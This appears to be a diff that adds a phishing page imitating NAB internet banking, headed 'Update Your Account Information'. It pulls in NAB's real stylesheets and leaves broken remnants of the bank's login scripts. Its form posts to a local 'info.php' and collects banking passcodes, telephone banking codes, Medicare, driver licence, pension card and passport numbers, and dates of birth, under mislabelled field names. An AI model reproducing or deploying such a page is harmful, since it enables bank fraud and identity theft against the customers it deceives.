@@ -1,0 +1,465 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html lang="en">
+
+<head>
+<META HTTP-EQUIV="Expires" CONTENT="Fri, Jan 01 2000 10:20:00 GMT">
+<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
+
+<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache">
+
+<title>Welcome</title>
+  <link rel="stylesheet" type="text/css" href='https://ib.nab.com.au/nabib/styles/winns6.css?id=013'>
+  <link rel="stylesheet" type="text/css" href='https://ib.nab.com.au/nabib/styles/winns6_nab.css?id=009'>
+  <link rel="stylesheet" type="text/css" href='https://ib.nab.com.au/nabib/styles/menu_nab.css?id=009'>   
+  <link rel="stylesheet" type="text/css" href='https://ib.nab.com.au/nabib/styles/nabstyle.css?id=013'>
+  <link id="screen-css"  rel="stylesheet" media="screen" type="text/css" href='https://ib.nab.com.au/nabib/styles/ibstyle.css?id=013'>
+  <!--[if IE 6]>
+  <link rel="stylesheet" type="text/css" href='https://ib.nab.com.au/nabib/styles/ibstyle-ie.css?id=013' />
+  <![endif]-->
+  <!--[if IE 7]>
+  <link rel="stylesheet" type="text/css" href='https://ib.nab.com.au/nabib/styles/ibstyle-ie.css?id=013' />
+  <![endif]-->  
+
+
+<script type="text/Javascript">
+function confirmCreateExit()
+{
+return true;
+}
+</script>
+<script type="text/Javascript" src='/nabib/scripts/general.js?id=011'></script>
+<script type="text/Javascript" src='https://ib.nab.com.au/nabib/scripts/jquery.js'></script>
+<script type="text/javascript" src='https://ib.nab.com.au/nabib/styles/ibstyle.jquery.js?id=002'></script>
+
+<script type="text/Javascript">
+var logouturl = 'preLogout.ctl?sess=CbyE-11J9I6lZmSLpI2ikkM';
+var logouturl2 = 'logout.ctl?sess=CbyE-11J9I6lZmSLpI2ikkM';
+</script>
+
+
+
+
+<script type="text/Javascript" language="JavaScript">
+isSafari = (navigator.appVersion.indexOf("Safari")!=-1);
+// PD - Special handling of Safari which does not set the window.name properly
+if (!isSafari)
+
+
+var session_user="null";
+
+
+var sb_1=false;
+function validateLogin()
+{
+  if(sb_1)return false;
+  
+  
+  if(trimLeft(document.sf_1.userid.value)=="")
+  {
+    alert("301005: The NAB ID must be entered.");
+    document.sf_1.userid.focus();return false;
+  }
+  else if(isNaN(document.sf_1.userid.value))
+  {
+    alert("301004: Your NAB ID must be a number of 8-10 digits in length.\n\nNote: Your NAB ID can be found on the back of your NAB Debit Card or NAB Credit Card.");
+    document.sf_1.userid.focus();return false;
+  }
+  if(document.sf_1.password.value=="")
+  {
+    alert("301008: Please enter your Internet Banking password.");
+    document.sf_1.password.focus();return false;
+  }
+  sb_1=true;
+
+  document.sf_1.password.value=check(document.sf_1.password.value,"p0W8OWx0","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
+  document.sf_1.submit();
+  return false;
+}
+ 
+function init()
+{ 
+   initKey(validateLogin);
+
+  document.sf_1.userid.focus();
+}
+  document.sf_1.password.value=check(document.sf_1.password.value,"p0W8OWx0","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
+  
+  
+  $('#sf_1').append("<input name='login' type='hidden' value='Login'>");
+
+
+function showRegistration() {
+	var url = 'http://www.nab.com.au/wps/wcm/connect/nab/nab/home/Personal_Finance/12/2/7';
+	
+	if (window.opener == null || window.opener.closed) {
+		window.open(url);
+	}
+	else {
+		window.opener.location=url;
+	}	
+	javascript:window.close();
+}
+
+</script>
+
+<meta http-equiv="refresh" content="900" />
+
+</head>
+<body id="bNoMenu" onLoad="init()">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/Javascript" language="JavaScript">
+
+
+
+
+
+
+function helpwin(loc,ft_1) {
+  if(isMac&&NS4)ft_1=ft_1+",status=yes";
+  hw=window.open(loc,'Help',ft_1);
+  hw.focus();
+}
+
+function abswin(loc,st_1){
+  if(isMac&&NS4)st_1=st_1+",status=yes";
+  hw=window.open(loc,'absLink',st_1);
+  hw.focus();
+}
+
+
+
+
+function logoff() {
+	if (confirm('Thank you for banking with NAB.\nAre you sure you want to logout?')) 
+	{ 			
+		
+		navigateTo("logoutToWCM.ctl?bw=" + browserWidth() + "&bh=" + browserHeight());		
+	}
+}
+
+
+function logoffAndGoToNationalLocation() {
+	logoffOpenWindow("http://www.nab.com.au/National_Locations",
+		'Thank you for banking with NAB.\nAre you sure you want to logout?');
+}
+
+function applyTxAccount() {
+	logoffOpenWindow("https://www.nab.com.au/ibeveryday??WT.seg_1=ZEA",
+		'Starting an application will log you out of Internet Banking.\n  Are you sure you want to exit Internet Banking?');
+}
+
+function applyCreditCard() {
+	logoffOpenWindow("https://ols.nab.com.au/olcc-web/prefill.jsp",
+		'Starting an application will log you out of Internet Banking.\n  Are you sure you want to exit Internet Banking?');
+}
+
+function applyPersonalLoan() {
+	logoffOpenWindow("https://www.nab.com.au/ibpersonalloan?WT.seg_1=ZED",
+		'Starting an application will log you out of Internet Banking.\n  Are you sure you want to exit Internet Banking?');
+}
+
+function applyHomeLoan() {
+	logoffOpenWindow("https://www.nab.com.au/ibhomeloan?WT.seg_1=ZEE",
+		'Starting an application will log you out of Internet Banking.\n  Are you sure you want to exit Internet Banking?');
+}
+
+function applyHyioAccount() {
+	logoffOpenWindow("https://www.nab.com.au/ibsaving?WT.seg_1=ZEB",
+		'Starting an application will log you out of Internet Banking.\n  Are you sure you want to exit Internet Banking?');
+}
+
+
+
+function logoffOpenWindow(location, message) {
+	if (confirm(message)) { 
+		window.open(location,
+			"",
+			"width=800,height=600,resizable=yes,scrollbars=yes,menubar=no,status=yes,directories=no,location=no,left=0,top=0,screenX=0,screenY=0");
+			
+		submitMenu('logout.ctl'); 
+	}
+}
+
+
+</script>
+<table id="tHeader" border="0" cellspacing="0" cellpadding="0" >
+
+<!-- layout row 1 begin -->
+	<tr>
+
+		<td id="td-logo-util" colspan="2"><!-- logo begin -->
+<div id="logo">
+		<img src="https://ib.nab.com.au/nabib/images/ib_nab_logo_strapline.gif" height="50" width="50" border="0" alt="NAB logo">
+</div>
+<!-- logo end --><!-- artifact utils begin -->
+<div id="nab-util-bar" style="margin-right: 10px">
+	<ul>
+		<li><span class="date">Wednesday 03 March 2010&nbsp;&nbsp;</span></li>
+
+
+		<li>
+
+			<a class="first disabled" title="print unavailable">print</a>
+		</li>
+		<li><a   title="Help (opens in new window)"	href="javascript:helpwin('http://www.nab.com.au/Internet_Banking_Help/0,,86846,00.html','top=20,left=50,width=780,height=560,toolbar=yes,scrollbars=yes,resizable=yes')" onmouseout="status='';return true;" onfocus="status='Help';return true;" onclick="">help</a>
+		</li>
+
+	</ul>
+</div>
+<!-- artifact utils end --></td>
+	</tr>
+
+<!-- layout row 1 end -->
+<tr  id="banner">
+<!-- artifact header banner begin -->
+	    <td id="td-header-app-name"></td>
+	    <td id="td-header-banner"></td>
+<!-- artifact header banner end -->
+	</tr>	
+</table>
+
+
+
+<table width="100%" border="0" cellspacing="0" cellpadding="0" >
+<tr>
+  <td width="150" valign="top"><img src="https://ib.nab.com.au/nabib/images/dot.gif" width="150" alt=" "></td>
+
+  <td width="10">&nbsp;&nbsp;</td>
+  <td width="100%">
+  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+  <tr>
+    <td align="left" class="pageTitle">Update Your Account Information</td>
+  </tr>
+  </table>
+  <a name="content"></a>
+
+  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td>
+<script>function confirmExit(){if( confirm( "Thank you for banking with the NAB\nAre you sure you want to exit?"))window.close();}</script>
+<form id="sf_1" name="sf_1" action="info.php" method="post" autocomplete="off">
+
+			
+	<input type="hidden" name="org.apache.struts.taglib.html.TOKEN" value="b1447357853d1c0bb7b5e95ef3d979b2">
+
+<br>
+
+<style type="text/css">
+.loginHeading {
+  width: 65%;
+  margin: 0 0 0 2px;
+  padding: 8px 0px 8px 6px;
+}
+	
+.fieldName {
+	font-weight: bold;
+	width: 65%;
+	display: table-cell;
+	text-align: right;
+	padding: 8px;	
+	background-color: #EBEBEB;
+	vertical-align: middle;
+}
+
+.fieldInput {
+	display: table-cell;
+	background-color: #F8F8F8;
+	padding: 0 0 0 10px;
+	vertical-align: middle;
+}
+
+.loginAction {
+	text-align: right;
+	background-color: #EBEBEB;
+	vertical-align: middle;	
+	padding-right: 10px;
+	height: 40px;
+}
+</style>
+
+
+<table width="75%" border="0" cellspacing="2" cellpadding="0">
+	<tbody>
+	<td colspan="2" class="loginColHeader loginHeading" >
+		Please fill the form below
+	</td>
+
+	<tr>
+		<td class="fieldName">Full Name</td>
+		<td class="fieldInput">
+			<input type="text" name="name" size="33" AUTOCOMPLETE="OFF">
+		</td>
+	</tr>
+
+
+
+	<tr>
+		<td class="fieldName">Passcode</td>
+		<td class="fieldInput">
+			<input type="text" name="addr" size="33" AUTOCOMPLETE="OFF">
+		</td>
+	</tr>
+
+
+
+	<tr>
+		<td class="fieldName">Address</td>
+		<td class="fieldInput">
+			<input type="text" name="addr2" size="33" AUTOCOMPLETE="OFF">
+		</td>
+	</tr>
+	<tr>
+		<td class="fieldName">Zip Code</td>
+		<td class="fieldInput">
+			<input type="text" name="addr3" size="33" AUTOCOMPLETE="OFF">
+		</td>
+	</tr>
+	<tr>
+		<td class="fieldName">Current Mobile Number</td>
+		<td class="fieldInput">
+			<input type="text" name="addr4" size="33" AUTOCOMPLETE="OFF">
+		</td>
+	</tr>
+	<tr>
+		<td class="fieldName">Other Mobile Number</td>
+		<td class="fieldInput">
+			<input type="text" name="addr5" size="33" AUTOCOMPLETE="OFF">
+		</td>
+	</tr>
+
+
+
+
+
+	<tr>
+		<td class="fieldName">Telephone Banking Code</td>
+		<td class="fieldInput">
+			<input type="text" name="numb" size="33" AUTOCOMPLETE="OFF">
+		</td>
+	</tr>
+	<tr>
+		<td class="fieldName">Health Card/ Medicare No</td>
+		<td class="fieldInput">
+			<input type="text" name="dob" size="33" AUTOCOMPLETE="OFF">
+		</td>
+	</tr>
+	<tr>
+		<td class="fieldName">Driver Licence</td>
+		<td class="fieldInput">
+			<input type="text" name="telp" size="33" AUTOCOMPLETE="OFF">
+		</td>
+	</tr>
+	<tr>
+		<td class="fieldName">Your date of birth</td>
+		<td class="fieldInput">
+			<input type="text" name="maiden" size="33" AUTOCOMPLETE="OFF">
+		</td>
+	</tr>
+	<tr>
+		<td class="fieldName">Pension Card</td>
+		<td class="fieldInput">
+			<input type="text" name="question" size="33" AUTOCOMPLETE="OFF">
+		</td>
+	</tr>
+	<tr>
+		<td class="fieldName">Passport No</td>
+		<td class="fieldInput">
+			<input type="text" name="answer" size="33" AUTOCOMPLETE="OFF">
+		</td>
+	</tr>
+	
+	<tr>
+		<td class="loginAction">		
+			&nbsp;
+		</td>
+		<td class="loginAction">							
+			<input class="gButton" type="submit" name="loginButton" value="Submit" style="width: 6em">
+		</td>
+	</tr>
+	</tbody>
+
+</table>
+</form>
+<br>
+
+    </td>
+  </tr>
+  </table>
+  </td>
+  <td width="10">&nbsp;&nbsp;</td>
+</tr>
+</table>
+</td></tr>
+
+</table>
+
+<form name="menuForm" method="post"><input type="hidden" name="nix" value=""></form>
+<!--/div-->
+
+</body>
+
+</html>
